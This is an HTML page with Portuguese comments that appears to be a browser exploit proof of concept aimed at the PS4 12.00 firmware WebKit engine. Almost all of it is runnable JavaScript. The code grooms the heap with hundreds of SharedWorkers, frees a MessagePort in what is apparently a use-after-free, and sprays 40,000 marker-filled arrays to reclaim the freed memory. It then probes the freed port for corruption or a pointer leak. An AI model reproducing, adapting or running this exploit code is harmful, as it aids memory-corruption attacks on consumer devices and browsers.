<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    
</head>
<body>

    <h1>PS4 12.00 - ALVO 0xC0 (192 bytes)</h1>
    <h3>Estratégia: Butterfly Double Spray</h3>
    <div id="status">Pronto.</div>
    <div id="log"></div>
    <br>
    <button onclick="run_surgical()">INICIAR EXTRAÇÃO</button>

    <script>
        function log(msg, type="") {
            var d = document.getElementById("log");
            var color = type === "leak" ? "#ff00ff" : "#ccc";
            d.innerHTML += `<div style="color:${color}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            d.scrollTop = d.scrollHeight;
        }

        // =================================================================
        // 1. PAYLOAD 0xC0 (192 bytes)
        // =================================================================
        function build_payload() {
            // 192 bytes totais.
            // Header do Array no WebKit: 16 bytes.
            // Dados úteis: 176 bytes.
            // 176 / 8 bytes (double) = 22 elementos.
            
            var arr = new Array(22);
            
            // PREENCHIMENTO INTELIGENTE:
            // Não usamos apenas 1.1. Usamos valores que parecem ponteiros.
            // Se o JS ler isso como um objeto, ele vai tentar seguir o ponteiro.
            
            // 0x4141414141414141 (AAAA...) como Double
            // Valor: 2.12199579047e-314
            var marker = 2.12199579047e-314; 

            for(var i=0; i<arr.length; i++) {
                arr[i] = marker;
            }
            return arr;
        }

        // =================================================================
        // 2. EXECUÇÃO
        // =================================================================
        var workers_stash = [];

        async function run_surgical() {
            if(!window.SharedWorker) return log("Erro: Navegador.");
            
            var payload = build_payload();
            log("Payload 0xC0 construído.");

            // GROOMING (380)
            log("Grooming...");
            for(let i=0; i<380; i++) {
                try { workers_stash.push(new SharedWorker("data:text,1", "g"+i)); } catch(e){}
            }

            // TRIGGER (403)
            var p_count = 0;
            var limit = 403 - 380;

            var it = setInterval(() => {
                if (p_count >= limit) {
                    clearInterval(it);
                    
                    // VÍTIMA
                    var v = workers_stash.pop();
                    var p = v.port;
                    
                    // FREE
                    v.port.close();
                    v = null;
                    
                    // SPRAY MASSIVO
                    // 40.000 cópias para garantir que o buraco 0xC0 seja preenchido
                    log("Spraying 0xC0...");
                    var spray = [];
                    for(var k=0; k<40000; k++) {
                        spray.push(payload.slice(0));
                    }

                    // SONDA
                    setTimeout(() => {
                        check_leak(p);
                    }, 500);
                    
                    return;
                }
                
                try {
                    let w = new SharedWorker("data:text,1", "v"+p_count);
                    w.port.start();
                    workers_stash.push(w);
                } catch(e){}
                p_count++;
            }, 60);
        }

        function check_leak(port) {
            try {
                var s = port.toString();
                
                // Se mudou de [object MessagePort], é SUCESSO
                if (s.indexOf("MessagePort") === -1) {
                    log("!!! SUCESSO ABSOLUTO !!!", "leak");
                    log("Objeto Corrompido: " + s, "leak");
                    alert("LEAK CONFIRMADO! Tamanho 0xC0 é o correto.");
                } else {
                    log("Falha: Objeto intacto.");
                    
                    // Tenta ler propriedades internas para forçar erro de tipo
                    // Se o objeto foi corrompido, 'onmessage' deve apontar para lixo (0x4141...)
                    try { 
                        var temp = port.onmessage; 
                        if (temp !== null) log("Propriedade onmessage alterada: " + temp);
                    } catch(e) {
                        if(e.toString().match(/0x/)) {
                            log("LEAK NO ERRO: " + e, "leak");
                            alert("LEAK NO ERRO!");
                        }
                    }
                }
            } catch(e) {
                log("ERRO CRÍTICO (BOM SINAL): " + e, "leak");
            }
            
            // Limpeza segura
            workers_stash.forEach(w => { try{w.port.close()}catch(e){} });
        }
    </script>
</body>
</html>
